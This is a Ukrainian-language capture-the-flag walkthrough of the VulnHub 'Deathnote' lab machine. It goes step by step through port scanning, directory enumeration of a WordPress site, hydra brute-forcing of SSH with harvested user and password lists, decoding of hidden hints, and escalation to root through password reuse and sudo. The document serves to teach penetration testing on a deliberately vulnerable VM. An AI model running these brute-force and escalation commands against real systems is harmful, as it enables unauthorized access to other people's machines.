# AC-module2-Deathnote

```plaintext
https://www.vulnhub.com/entry/deathnote-1,739/)
```
### **Крок 1: Отримати IP-адресу цільової машини та просканувати відкриті порти**

```sh
nmap -sV 192.168.160.0/24
```
![alt text](./Images/image1.png)

📌 **Результат**:  

- Бачимо два відкритих порти: `22 та 80`.
- Робити брутфорс на `ssh (22)` не має сенсу, до поки ми не маємо а ні логіну, а ні паролю.
- В браузері відкриваємо `192.168.160.177:80` з метою розуміння, який саме сервіс працює на 80 порті.
- Як результат маємо помилку, але маємо і підказку у вигляді доменного імені `deathnote.vuln`:

![alt text](./Images/image2.png)

- Робимо висновок, що нам потрібно зарезолвити це доменне ім'я, а це можно зробити за допомогою локального файла hosts, яким можна скористатись, як локальною альтернативою DNS.

---

### **Крок 2: Знайти hosts**

```sh
whereis hosts
```
```plaintext
/etc/hosts
```

![alt text](./Images/image3.png)

---

### **Крок 3: Редагувати hosts у vim**

```sh
vim /etc/hosts
```

Переходимо в режим редагування `i`, вводимо `192.168.192.177 deathnote.vuln` і зберігаємо `wq!`

![alt text](./Images/image4.png)

---

### **Крок 4: Зайти на вебсторінку знову**

![alt text](./Images/image5.png)

- У HTML-коді знаходимо посилання на директорію, де була зберігається картинки, в назві яких міститься `"kira"`.

![alt text](./Images/image6.png)

- Заходимо за цією адресою, бачимо директорії і багато файлів.

```plaintext
http://deathnote.vuln/wordpress/wp-includes/js/
```

![alt text](./Images/image7.png)

---

### **Крок 5: Сканувати директорію**

```sh
dirb http://deathnote.vuln/
```

![alt text](./Images/image8.png)

**Ця команда вивела нам файли, серед них ми знайшли:**
- /robots.txt  
- /wordpress/wp-login.php

Заходимо на сторінку з `/robots.txt`, нас зустрічає текст, який каже, що нам потрібно зайти на `/important.jpg`. 

![alt text](./Images/image9.png)

Але не знайшовши там нічого, використовуємо команду:

```sh
curl http://deathnote.vuln/important.jpg
```
![alt text](./Images/image10.png)

![alt text](./Images/image11.png)

📌 **Результат**:  

```plaintext
login username: user.txt
```

- Отримуємо відповідь, у якій згадуються `user.txt` — може бути ідентифікатор, а також `notes.txt` — може бути список паролів. Шлях до каталогу, де знаходяться ці файли ми встановили, коли знайшли `"kira".jpg` за допомогою інспектора в браузері.
- Як результат переходимо за шляхом та маємо наступне:

![alt text](./Images/image12.png)

- зберігаємо собі notes.txt та user.txt:

```sh
wget http://deathnote.vuln/wordpress/wp-content/uploads/2021/07/notes.txt
wget http://deathnote.vuln/wordpress/wp-content/uploads/2021/07/user.txt
```

---

### **Крок 6: Використати інструмент для брут-форсу логінів і паролів hydra**

```sh
hydra -L user.txt -P notes.txt 192.168.160.177 ssh
```

- Як результат, маємо логін та пароль для ssh з'єднання:

```plaintext
[22][ssh] host: 192.168.160.177   login: l   password: death4me
```

![alt text](./Images/image13.png)

Заходимо через ssh порт з отриманими логіном і паролем `(l:death4me)`

```sh
ssh l@192.168.160.177
```

Після логінування через ssh в домашньому каталозі cеред файлів знаходимо `user.txt`

```sh
ls -lah
```
![alt text](./Images/image14.png)

Переглядаємо його та бачимо текст, написаний мовою `brainfuck`.
- Перекодовуємо його за допомогою dcode.fr або через термінал

```sh
echo '++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>>+++++.<<++.>>+++++++++++.------------.+.+++++.---.<<.>>++++++++++.<<.>>--------------.++++++++.+++++.<<.>>.------------.---.<<.>>++++++++++++++.-----------.---.+++++++..<<.++++++++++++.------------.>>----------.+++++++++++++++++++.-.<<.>>+++++.----------.++++++.<<.>>++.--------.-.++++++.<<.>>------------------.+++.<<.>>----.+.++++++++++.-------.<<.>>+++++++++++++++.-----.<<.>>----.--.+++..<<.>>+.--------.<<.+++++++++++++.>>++++++.--.+++++++++.-----------------.' | bf
```

📌 **Результат**:  

```plaintext
i think u got the shell , but you wont be able to kill me -kira
```

---

### **Крок 7: Знайти по всій файловій системі файли та директорії, які мають в назві “kira”**

```sh
find / -name "kira*" 2>/dev/null
```

![alt text](./Images/image15.png)

**Бачимо такі файли:**
- /home/kira/kira.txt
- /opt/L/kira-case

Переміщуємось по директоріях командами:

```sh
cd /home/kira/
ls -lah
cat case-file.txt
```
------------------
```sh
cd /opt/L
ls -lah
cd kira-case
ls -lah
cat case-file.txt
```
------------------
```sh
cd ..
cd fake-notebook-rule/
ls -lah
cat case.wav
```

```plaintext
63 47 46 7a 63 33 64 6b 49 44 6f 67 61 32 6c 79 59 57 6c 7a 5a 58 5a 70 62 43 41 3d
```

![alt text](./Images/image16.png)

При перегляді файлу case.wav бачимо інструкційний код, перекодовуємо його у текст — отримуємо: 

```sh
echo "63 47 46 7a 63 33 64 6b 49 44 6f 67 61 32 6c 79 59 57 6c 7a 5a 58 5a 70 62 43 41 3d" | xxd -r -p | base64 -d
```

```plaintext
passwd : kiraisevil
```

![alt text](./Images/image17.png)

---

### **Крок 8: Переходимо на користувача kira**

```sh
su kira
```

та вводимо отриманий пароль

![alt text](./Images/image18.png)

---

### **Крок 9: Пробуємо зайти під суперкористувачем, використавши той самий пароль**

```sh
sudo su
```

![alt text](./Images/image19.png)

```sh
cd ~
ls -lah
```

Знаходимо файл root.txt та виводимо:

```sh
cat root.txt
```

![alt text](./Images/image20.png)
